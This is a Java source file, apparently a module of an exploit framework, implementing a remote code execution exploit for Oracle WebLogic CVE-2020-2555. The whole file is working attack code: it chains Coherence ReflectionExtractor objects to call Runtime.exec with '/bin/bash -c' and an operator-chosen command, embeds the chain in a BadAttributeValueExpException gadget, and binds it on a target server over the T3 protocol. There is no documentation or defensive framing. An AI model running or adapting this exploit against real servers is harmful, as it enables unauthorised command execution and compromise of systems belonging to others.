package com.lucifaer.jokerframework.exploit.weblogic.cve_2020_2555;

import com.lucifaer.jokerframework.core.context.ShellContext;
import com.lucifaer.jokerframework.core.exploit.JokerBaseExploit;
import com.lucifaer.jokerframework.core.exploit.JokerExploit;
import com.lucifaer.jokerframework.core.exploit.utils.Gadgets;
import com.lucifaer.jokerframework.core.exploit.utils.Reflections;
import com.lucifaer.jokerframework.core.shell.ShellThrowableHandler;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import javax.management.BadAttributeValueExpException;
import javax.naming.Context;
import javax.naming.InitialContext;
import java.rmi.Remote;
import java.util.Hashtable;
import java.util.List;
import java.util.Map;

@Component(value = "cve-2020-2555-1")
public class Exp1 extends JokerBaseExploit implements JokerExploit {
    @Autowired
    ShellThrowableHandler shellThrowableHandler;

    private static final String defaultUrl = "127.0.0.1";
    private static final String defaultPort = "7001";

    public Exp1() {
        this.exploitName = "cve-2020-2555-1";
        this.targetUrl = defaultUrl;
        this.targetPort = defaultPort;
        this.expactedParams.put("cmd", null);
    }

    @Override
    public void exploit(ShellContext shellContext) {
        Map<String, String> shellParam = shellContext.getParams();
        String cmd = shellParam.get("cmd");
        ReflectionExtractor extractor1 = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]});
        ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{"null", new Object[0]});
        ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"/bin/bash", "-c", cmd}});

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        try {
            Reflections.setFieldValue(limitFilter, "m_comparator", chainedExtractor);

            Reflections.setFieldValue(limitFilter, "m_oAnchorTop", Runtime.class);

            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            Reflections.setFieldValue(badAttributeValueExpException, "val", limitFilter);

            String ip = this.targetUrl;
            String port = this.targetPort;
            Hashtable<String, String> env = new Hashtable<>();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "weblogic.jndi.WLInitialContextFactory");
            env.put(Context.PROVIDER_URL, String.format("t3://%s:%s", ip, port));

            Context context = new InitialContext(env);
            String name = "lucifaer";
            Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, badAttributeValueExpException), Remote.class);
            context.rebind("lucifaer", remote);
        }catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public List<String[]> documentation() {
        return null;
    }
}
